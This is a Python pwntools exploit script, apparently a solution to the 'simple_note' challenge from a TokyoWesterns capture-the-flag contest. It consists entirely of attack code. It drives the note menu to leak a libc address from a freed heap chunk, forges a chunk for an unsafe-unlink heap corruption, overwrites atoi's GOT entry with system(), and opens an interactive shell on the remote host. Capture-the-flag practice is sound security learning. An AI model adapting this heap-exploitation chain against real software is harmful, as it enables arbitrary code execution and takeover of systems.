#usr/bin/python

from pwn import *

r = remote('pwn1.chal.ctf.westerns.tokyo',16317)
#r =  process('./simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b')
print util.proc.pidof(r)

def addnote(size,note):
	r.recvuntil('Your choice:')
	r.sendline('1')
	r.recvuntil('size:')
	r.sendline(str(size))
	r.recvuntil('note:')
	r.send(note)
		

def delnote(idx):
	r.recvuntil('Your choice:')
	r.sendline('2')
	r.recvuntil('index:')
	r.sendline(str(idx))

def shownote(idx):
	r.recvuntil('Your choice:')
	r.sendline('3')
	r.recvuntil('index:')
	r.sendline(str(idx))

def editnote(idx,note):
	r.recvuntil('Your choice:')
	r.sendline('4')
	r.recvuntil('index:')
	r.sendline(str(idx))
	r.recvuntil('note:')
	r.sendline(note)

atoi_got = 0x602058
system_offset = 0x45390

addnote(0x80,'A') #note 0
addnote(0x80,'B') #note 1
addnote(0x80,'C') #note 2
delnote(0)
addnote(0x80,'D'*8) #note 3 [index 0]
shownote(0)

junk = r.recvuntil('DDDDDDDD')
leak = u64(r.recvn(6).strip().ljust(8,'\x00'))
log.info('leak is:%s' % hex(leak))
libc_base = leak - 0x3c4b78
log.info('libc base is:%s' % hex(libc_base))
system_addr = libc_base + system_offset
log.info('system address is:%s' % hex(system_addr))

addnote(0x90,'E'*0x90) #note 4 [index 3]
delnote(3)
addnote(0x80,'F') #note 5 [index 3]
addnote(0x80,'G') #note 6 [index 4]
addnote(0x80,'H') #note 7 [index 5]

payload = p64(0)+p64(0x80)+p64(0x6020c0)+p64(0x6020c8)
payload += 'A'*96
payload += p64(0x80)+p64(0x90)
editnote(3,payload)
delnote(4)

editnote(3,p64(atoi_got))
editnote(0,p64(system_addr))

r.interactive()